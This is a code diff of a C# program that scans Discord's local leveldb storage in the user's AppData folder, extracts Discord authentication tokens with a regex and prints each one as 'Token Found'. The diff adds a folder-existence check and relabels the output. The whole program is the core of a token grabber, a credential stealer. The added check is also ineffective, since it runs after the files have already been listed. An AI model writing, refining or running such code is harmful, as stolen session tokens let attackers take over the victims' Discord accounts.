@@ -8,10 +8,14 @@ class ZeroMemory
     public static void Main()
     {
         string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";
-        //
+        
         string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
+        if (!Directory.Exists(path))
+        {
+            Console.WriteLine("Discord path not found");
+            System.Environment.Exit(1);
+        }
         Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
-        //Match match = regex.Match(contents);
         foreach (var file in dbfiles)
         {
             FileInfo info = new FileInfo(file);
@@ -19,7 +23,7 @@ class ZeroMemory
             Match match = regex.Match(contents);
             if (match.Success)
             {
-                Console.WriteLine(match.Value);
+                Console.WriteLine("Token Found :"+match.Value);
             }
 
         }
